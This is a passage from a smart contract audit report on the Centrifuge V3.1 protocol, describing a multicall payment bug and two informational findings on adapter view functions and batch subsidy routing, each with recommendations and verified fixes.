Refund the caller if `msg.value` > `cost` using `gateway.withdrawSubsidy` call.

### **Client**

Fixed in this refactor: https://github.com/centrifuge/protocol/pull/636

### **BurraSec**

Fix verified. With the refactor all flows now refund the caller, including the `repay` function.

## **[L-01] Multicall cannot batch multiple payable operations**

### **Target**

- [Hub.sol](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/hub/Hub.sol#L128)

### **Severity**

- Impact: Low
- Likelihood: Medium

### **Description**

The Hub contract's multicall implementation contains a bug when batching multiple permisionless payable operations like `notifyDeposit` and `notifyRedeem`. These functions are designed to



20

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> | <u>October 12, 2025</u>

accept ETH payments to cover cross-chain messaging costs, depositing the received value into the Gateway’s subsidy pool for the specified pool.

When multicall executes multiple payable functions using delegatecall, the `msg.value` remains constant across all calls. For example, if a user calls multicall with 1 ETH and includes two `notifyDeposit` operations, both calls will see `msg.value` = 1 ETH. The first `notifyDeposit` successfully deposits this 1 ETH to the Gateway subsidy pool via `gateway.depositSubsidy{value: msg.value}(poolId)`. However, when the second `notifyDeposit` executes, it also attempts to forward `msg.value` (still 1 ETH) to the Gateway, but the Hub contract no longer holds these funds since they were already transferred in the first call. This causes the second operation to revert with an “Out of Funds” error.

The impact is that users cannot batch multiple deposit or redeem notifications in a single transaction, defeating the purpose of the multicall batching optimization. Each operation must be called individually, resulting in separate cross-chain messages and higher costs.

## **Recommendation**

Update `notifyDeposit` and `notifyRedeem` to calculate the actual cost of a message, so this cost can be forwarded to the Gateway to pay for the transfer instead the whole `msg.value`. Alternatively, multicall could be gated only for actions

## **Client**

Fixed in this refactor: https://github.com/centrifuge/protocol/pull/636 The payment is only done at the end of the multicall, and the cost is paid by the caller.

## **BurraSec**

Fix verified. Value is not moved in the loop anymore, buy only at the end of the multicall.

## **[I-01] Missing global adapter fallback in view functions**

### **Target**

* [MultiAdapter.sol](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/MultiAdapter.sol#L194-L215)

Burra Security | 21

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> <u>October 12, 2025</u>

## **Severity**

Informational

## **Description**

If the adapters are not configured per pool, the global adapters are used instead. This behavior is also present in the <span style="color:#435489">MultiAdapter::poolAdapters()</span> function, where the global adapters are returned if the pool-specific adapters list is empty:

```solidity
  1      function poolAdapters(uint16 centrifugeId, PoolId poolId) public
            view returns (IAdapter[] memory adapters_) {
  2          adapters_ = adapters[centrifugeId][poolId];
  3
  4          // If adapters not configured per pool, then use the global
                adapters
  5  >>>     if (adapters_.length == 0) adapters_ = adapters[centrifugeId][
        GLOBAL_ID];
  6      }
```

However, other view functions, including <span style="color:#435489">quorum()</span>, <span style="color:#435489">threshold()</span>, <span style="color:#435489">recoveryIndex()</span> and <span style="color:#435489">activeSessionId()</span>, always return the values for the configured pool adapters. If they are not set, these functions revert due to an out-of-bounds error.

## **Recommendation**

The other view functions should follow the same pattern used in <span style="color:#435489">poolAdapters()</span> and return the values of the global adapters when the pool adapters are not configured (i.e., when the list is empty).

## **Client**

Fixed here https://github.com/centrifuge/protocol/pull/658 and https://github.com/centrifuge/protocol/pull/707

## **BurraSec**

Fix verified. View functions return correct values.



22

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> | <u>October 12, 2025</u>

## **[I-02] SetPoolAdapters batches with global actions, but pays from target pool’s subsidy**

### **Target**

* [MessageLib.sol](https://github.com/centrifuge/protocol/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/libraries/MessageLib.sol#L266)

### **Severity**

Informational

### **Description**

When batching, `messagePoolId` is used to sort msgs into batches, while the `messagePoolIdPayment` of the first msg in the batch is used to determine which pool’s subsidy is used to fund the batch.

`SetPoolAdapters` msg is specific in that its `messagePoolId` is 0 (global id), but its `messagePoolIdPayment` is target pool id. So `SetPoolAdapters` will be put in a batch with global msgs. If order of messages in batch is `[SET_POOL_ADAPTERS] [GLOBAL_A] ` the `SetPoolAdapter`’s target pool would be used to fund the whole batch, but if some other msg is the first msg then global pool would be used for funding. That opens up some interesting options for manipulating which subsidy pool is used.

However, currently there is no scenario where `SetPoolAdapter` would be in the same multicall (in the same batch) with other global actions. If that were to change, special attention should be paid to the fact that `SetPoolAdapter`’s position in the batch can determine the subsidy pool used.

### **Recommendation**

Document this behavior in the code comments to explain that `SetPoolAdapters` intentionally routes through global infrastructure while maintaining pool-specific payment responsibility. This will help future developers understand the design choice.

### **Client**

Subsidize and `messagePoolIdPayment` was removed in: https://github.com/centrifuge/protocol/pull/636 which removes any possible issue in the future.

Burra Security | 23

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>

<u>October 12, 2025</u>

## **BurraSec**

Fix verified.



24

Burra Security